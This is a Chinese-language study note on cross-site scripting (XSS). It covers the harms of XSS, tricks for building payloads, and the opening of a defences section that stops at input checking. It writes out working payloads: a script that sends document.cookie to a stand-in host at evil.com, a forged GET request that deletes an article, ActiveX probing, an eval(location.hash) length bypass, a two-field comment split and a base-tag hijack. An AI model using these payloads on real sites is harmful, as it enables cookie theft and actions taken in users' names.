# XSS
跨站脚本攻击，英文全称是Cross Site Script，本来缩写是CSS，但是为了和层叠样式表（Cascading Style Sheet, CSS）有所区别，所以在安全领域叫做“XSS”。



## Xss危害

### 1. 获取cookie

`    http://www.a.com/test.htm? abc="><script src=http://www.evil.com/evil.js ></script>`

```js
// evil.js
var img = document.createElement("img");
img.src = "http://www.evil.com/log? "+escape(document.cookie);
document.body.appendChild(img);
```

措施：

1. Set-Cookie时给关键Cookie植入HttpOnly标识

2. 把Cookie与客户端IP绑定，从而使得XSS窃取的Cookie失去意义

### 2. 构造GET、POST请求

正常删除该文章的链接是：`    http://blog.sohu.com/manage/entry.do? m=delete&id=156713012`

通过插入一张图片来发起一个GET请求，如果作者执行了该脚本则会删除文章，攻击者将通过XSS诱使用户执行XSS Payload

```js
var img = document.createElement("img");
img.src = "http://blog.sohu.com/manage/entry.do? m=delete&id=156713012";
document.body.appendChild(img);
```

POST同样，可以构造一个form表单提交或直接发送post请求

XSS攻击后，攻击者除了可以实施“Cookie劫持”外，还能够通过模拟GET、POST请求操作用户的浏览器。**这在某些隔离环境中会非常有用，比如“Cookie劫持”失效时，或者目标用户的网络不能访问互联网等情况。**

### 3. XSS钓鱼

前面说XSS可构造GET、POST请求，考虑下面2种场景：

1. 在提交表单时要求用户输入验证码，那么一般的XSS Payload都会失效；

2. 在大多数“修改用户密码”的功能中，在提交新密码前，都会要求用户输入“Old Password”。而这个“Old Password”，对于攻击者来说，往往是不知道的。



绕过方案：

1. 对于验证码，XSS Payload可以通过读取页面内容，将验证码的图片URL发送到远程服务器上来实施——攻击者可以在远程XSS后台接收当前验证码，并将验证码的值返回给当前的XSS Payload，从而绕过验证码。
2. 为了窃取密码，攻击者可以将XSS与“钓鱼”相结合。伪造登录框，诱导用户输入用户名、密码

### 4. 识别用户浏览器

`    alert(navigator.userAgent);`

mac：'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'

ios：'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36'

根据浏览器支持的某些特性来更加具体地判断浏览器机器版本，利用浏览器漏洞实施其它攻击。

### 5. 识别用户安装的软件

在IE中，可以通过判断ActiveX控件的classid是否存在，来推测用户是否安装了该软件。这种方法很早就被用于“挂马攻击”——黑客通过判断用户安装的软件，选择对应的浏览器漏洞，最终达到植入木马的目的。

```
try {
var Obj = new ActiveXObject('XunLeiBHO.ThunderIEHelper');
} catch (e){
// 异常了，不存在该控件
}
```

### 6. CSS History Hack

css的visited属性——如果用户曾经访问过某个链接，那么这个链接的颜色会变得与众不同。见 `1 CSS history.html`

### 7. XSS蠕虫

XSS Worm是XSS的一种终极利用方式，它的破坏力和影响力是巨大的。但是发起XSS Worm攻击也有一定的条件。一般来说，用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起XSS Worm攻击。比如，发送站内信、用户留言等页面，都是XSS Worm的高发区，需要重点关注。而相对的，如果一个页面只能由用户个人查看，比如“用户个人资料设置”页面，因为缺乏用户之间互动的功能，所以即使存在XSS，也不能被用于XSS Worm的传播。

## XSS构造技巧

### 1. 绕过长度

如果后台对产生XSS的地方有变量的长度限制

`    <input type=text value="$var" />`

服务器端如果对输出变量“$var”做了严格的长度限制，那么攻击者可能会这样构造XSS：

`    $var为： "><script>alert(/xss/)</script>`

期望`    <input type=text value=""><script>alert(/xss/)</script>" />`

如果后台限制20个字符，则实际为`    $var输出为： "><script> alert(/xss`

连一个完整的函数都无法写完，XSS攻击可能无法成功。



换一个事件的写法：

`    $var输出为： "onclick=alert(1)//`

实际输出：`    <input type=text value="" onclick=alert(1)//"/>`

也可以通过简短的代码加载更多的外部脚本



另一个“藏代码”的地方是“location.hash”。而且根据HTTP协议，location.hash的内容不会在HTTP包中发送，所以服务器端的Web日志中并不会记录下location.hash里的内容，从而也更好地隐藏了黑客真实的意图。

`    $var输出为： " onclick="eval(location.hash.substr(1))`

`    <input type="text" value="" onclick="eval(location.hash.substr(1))" />`

url: `    http://www.a.com/test.html#alert(1)` 就会弹窗

location.hash本身没有长度限制，但是浏览器的地址栏是有长度限制的，不过这个长度已经足够写很长的XSS Payload了。要是地址栏的长度也不够用，还可以再使用加载远程JS的方法，来写更多的代码。



2个文本框绕过：

```html
<input id=1 type="text" value="" />
xxxxxxxxxxxxx
<input id=2 type="text" value="" />
```

2个输入框分别输入：

`    "><!--`    

`    --><script>alert(/xss/); </script>`

```html
<input id=1 type="text" value=""><!--" />
xxxxxxxxxxxxxxxxx
<input id=2 type="text" value="--><script>alert(/xss/); </script>" />
```

第一个输入框只有6个字符

### 2. 使用base标签

见demo：5 html base.html

`<base>标签将指定其后的标签默认从base标签的href取URL：`

`<base>`标签可以出现在页面的任何地方，并作用于位于该标签之后的所有标签。攻击者如果在页面中插入了<base>标签，就可以通过在远程服务器上伪造图片、链接或脚本，劫持当前页面中的所有使用“相对路径”的标签。

### 3. Window.name

window对象是浏览器的窗体，而并非document对象，因此很多时候window对象不受同源策略的限制。攻击者利用这个对象，可以实现跨域、跨页面传递数据。

Demo: 待补充

## XSS防御

### 1. Cookie httpOnly

浏览器将禁止页面的JavaScript访问带有HttpOnly属性的Cookie。

XSS攻击带来的不光是Cookie劫持问题，还有窃取用户信息、模拟用户身份执行操作等诸多严重的后果。如前文所述，攻击者利用AJAX构造HTTP请求，以用户身份完成的操作，就是在不知道用户Cookie的情况下进行的。使用HttpOnly有助于缓解XSS攻击，但仍然需要其他能够解决XSS漏洞的方案。

### 2. 输入检查
